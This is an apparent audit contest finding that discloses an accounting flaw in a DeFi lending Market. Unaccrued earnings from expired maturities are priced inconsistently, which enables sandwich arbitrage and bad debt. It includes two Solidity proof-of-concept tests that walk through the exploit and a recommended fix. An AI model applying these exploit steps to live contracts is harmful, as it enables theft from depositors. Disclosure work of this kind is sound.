---
id: 25168
severity: "Medium"
---

# Expired maturities longer than FixedLib.INTERVAL with unaccrued earnings may be arbitraged and/or might lead to significant bad debt creation

## Description



## Proof of Concept

## Vulnerability Detail

`Market::totalAssets()` includes the unassigned earnings up to `block.timestamp - (block.timestamp % FixedLib.INTERVAL);`, disregarding past maturities.

`Market::repayAtMaturity()` will convert into `floatingAssets` the past unassigned earnings, no matter how late the repayment is.

This discrepancy allows attackers to arbitrage the `Market` with minimal exposure (by sandwiching) the repayment.

Possible worse, it will lead to a lot of bad debt creation, as liquidations preview the `seizeAvailable` of a liquidatee in `Auditor::checkLiquidation()`, but the actual collateral balance of the user will be bigger due to the unaccrued earnings being converted to `floatingAssets`.

The following 2 POCs demonstrate both scenarios, add the tests to `Market.t.sol`:

```solidity
function test_POC_expired_maturities_LeftoverCollateral() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(2*maturity);

  // BOB deposits just to clear earnings accumulator and floating debt,
  // which would impact calculations. The discrepancy in totalAssets()
  // will be only due to floatingAssets increase by repaying maturities
  // It also deposits collateral to pay the liquidator
  vm.prank(BOB);
  market.deposit(assets, BOB);

  // ALICE has more debt than collateral, so all collateral should be seized
  (uint256 aliceAssets, uint256 aliceDebt) = market.accountSnapshot(ALICE);
  assertGt(aliceDebt, aliceAssets);

  address liquidator = makeAddr("liquidator");
  deal(address(asset), liquidator, 100_000 ether);
  vm.startPrank(liquidator);
  asset.approve(address(market), type(uint256).max);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ALICE has leftover shares due to the floating assets increase
  // when paying the due maturity, so some debt will never be repaied
  (aliceAssets, aliceDebt) = market.accountSnapshot(ALICE);
  assertEq(aliceAssets, 46671780821917806592); // 46e18 assets
  assertEq(aliceDebt, 4005059259761449851306); // 4005e18 debt
}

function test_POC_expired_maturities_may_be_arbitraged() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(maturity + FixedLib.INTERVAL + 1);

  // BOB frontruns ALICE's repayment
  vm.prank(BOB);
  uint256 bobShares = market.deposit(assets, BOB);

  // ALICE Repays, accruing the unassigned earnings to floating assets
  vm.prank(ALICE);
  market.repayAtMaturity(maturity, type(uint256).max, type(uint256).max, ALICE);

  // BOB got free assets
  assertEq(market.previewRedeem(bobShares), 10046671780821917806594);
}
```

## Impact

Risk free arbitrage by attackers and significant bad debt creation which may not be cleared on liquidations.

## Code Snippet

[https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478-L479](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L478-L479>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L786](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L786>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L929-L941](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L929-L941>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219>) [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L248](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L248>)

## Recommendation

Convert the unaccrued earnings to `earningsAccumulator` instead of directly to floating assets. In `Market::totalAssets()`, remove the section of previewing unaccrued earnings, as they will go through the `earningsAccumulator` and can not be arbitraged.
